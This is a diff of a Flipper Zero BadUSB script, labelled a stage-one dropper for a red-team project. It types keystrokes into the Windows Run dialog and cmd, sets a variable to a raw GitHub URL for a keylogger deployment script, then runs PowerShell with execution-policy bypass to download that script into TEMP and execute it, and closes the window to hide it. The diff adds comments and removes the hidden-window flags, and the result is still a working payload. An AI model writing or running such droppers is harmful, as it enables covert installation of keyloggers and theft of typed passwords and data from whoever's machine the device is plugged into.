@@ -1,27 +1,32 @@
-
 REM Project Cerberus - Stage 1 Dropper
-REM Flipper Zero BadUSB Payload — Momentum Firmware (STEALTH)
+REM Flipper Zero BadUSB Payload — Momentum Firmware (non stealth)
 
 DEFAULTDELAY 80
 
+REM Wait for system to be ready
 DELAY 2000
 
+REM Open Run dialog and wait for it to fully render
 GUI r
 DELAY 1500
 
+REM Use cmd as the runner — more reliable than typing long strings into Run directly
+REM cmd /k keeps the window open so powershell has time to launch
 STRINGLN cmd
 DELAY 1000
 
+REM Now type into cmd — much more reliable than Run dialog for long strings
+REM Split the command into two lines using a variable to avoid dropped chars
 STRING set u=https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger/deploy.ps1
 DELAY 300
 ENTER
 DELAY 200
 
-STRING powershell -ep bypass -NonInteractive -NoProfile -w hidden -c "iwr $env:u -OutFile $env:TEMP\d.ps1; & $env:TEMP\d.ps1"
+STRING powershell -ep bypass -c "iwr $env:u -OutFile $env:TEMP\d.ps1; & $env:TEMP\d.ps1"
 DELAY 300
 ENTER
 DELAY 500
 
+REM Close the cmd window so it's not visible
 STRING exit
 ENTER
-
